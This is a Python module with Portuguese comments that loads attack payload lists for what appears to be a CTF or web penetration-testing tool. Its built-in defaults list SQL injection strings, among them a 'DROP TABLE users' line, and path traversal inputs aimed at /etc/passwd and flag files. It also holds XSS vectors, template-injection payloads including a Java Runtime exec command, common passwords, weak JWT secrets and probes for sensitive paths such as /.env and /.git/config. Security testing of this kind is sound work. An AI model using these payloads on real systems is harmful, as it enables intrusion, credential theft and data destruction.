"""
core/payloads.py — engine de payloads dinâmicos.

Carrega de arquivos JSON em payloads/.
Se não encontrar, usa os defaults embutidos.
Isso permite adicionar novos payloads sem tocar no código.
"""

from __future__ import annotations

import json
from pathlib import Path

# diretório relativo ao pacote
_PAYLOAD_DIR = Path(__file__).parent.parent / "payloads"

# ── defaults embutidos (fallback) ─────────────────────────────

_DEFAULTS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "admin'--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        '" OR "1"="1',
        "' OR 1=1 LIMIT 1 --",
        "') OR 1=1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        "1; DROP TABLE users--",
        # blind
        "' AND SLEEP(3)--",
        "' AND 1=2--",
        "' AND 1=1--",
        "' AND (SELECT 1 FROM users LIMIT 1)='1",
    ],
    "traversal": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/etc/passwd",
        "..%2fetc%2fpasswd",
        "..%252fetc%252fpasswd",
        "public/../private/flag.txt",
        "public/../../private/flag.txt",
        "../private/flag.txt",
        "../../private/flag.txt",
        "../flag.txt",
        "../../flag.txt",
        "../../../flag.txt",
        "....//flag.txt",
        "%2e%2e/flag.txt",
    ],
    "passwords": [
        "admin", "password", "123456", "guest", "guest123",
        "admin123", "root", "toor", "pass", "test",
        "a", "abc", "qwerty", "letmein", "welcome",
        "123", "1234", "12345", "secret", "changeme",
        "passw0rd", "P@ssw0rd", "admin@123",
        "flag", "ctf", "hacker", "pwned", "password1",
        "superman", "batman", "dragon", "master", "trustno1",
    ],
    "xss": [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "';alert(1)//",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        '"><img src=x onerror=alert(document.domain)>',
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{7*'7'}}",
        "@{7*7}",
        "{% debug %}",
    ],
    "paths": [
        "/admin", "/admin/", "/api", "/api/v1", "/api/v2",
        "/.env", "/.git/config", "/.git/HEAD",
        "/robots.txt", "/sitemap.xml",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/config", "/config.json", "/settings",
        "/backup", "/backup.zip", "/backup.tar.gz",
        "/debug", "/health", "/status", "/metrics", "/ping",
        "/upload", "/uploads", "/files", "/static", "/assets",
        "/flag", "/flag.txt", "/secret", "/secret.txt",
        "/admin/panel", "/admin/login", "/admin/dashboard",
        "/api/admin", "/api/flag", "/api/secret",
        "/login", "/logout", "/register", "/signup",
        "/user", "/users", "/profile", "/account",
        "/dashboard", "/panel",
        "/v1", "/v2", "/v3",
        "/graphql", "/graphiql",
        "/.htaccess", "/web.config",
        "/server-status", "/server-info",
        "/phpinfo.php", "/info.php", "/test.php",
    ],
    "jwt_secrets": [
        "secret", "password", "admin", "key", "jwt",
        "supersecret", "mysecret", "your-256-bit-secret",
        "your_secret_key", "secretkey", "jwttoken",
        "changeme", "12345678", "qwerty",
        "HS256", "RS256", "none",
    ],
}


# ── API pública ───────────────────────────────────────────────

def load(name: str) -> list[str]:
    """
    Carrega lista de payloads pelo nome.

    Tenta carregar de payloads/<name>.json primeiro.
    Se não existir, usa o default embutido.
    Se nem o default existir, retorna lista vazia.
    """
    path = _PAYLOAD_DIR / f"{name}.json"
    if path.exists():
        try:
            data = json.loads(path.read_text())
            if isinstance(data, list):
                return data
        except Exception:
            pass
    return _DEFAULTS.get(name, [])


def list_available() -> list[str]:
    """Lista todos os payloads disponíveis (embutidos + externos)."""
    names = set(_DEFAULTS.keys())
    if _PAYLOAD_DIR.exists():
        for f in _PAYLOAD_DIR.glob("*.json"):
            names.add(f.stem)
    return sorted(names)


def save_custom(name: str, entries: list[str]) -> Path:
    """Salva lista de payloads customizada em payloads/<name>.json."""
    _PAYLOAD_DIR.mkdir(exist_ok=True)
    path = _PAYLOAD_DIR / f"{name}.json"
    path.write_text(json.dumps(entries, indent=2, ensure_ascii=False))
    return path
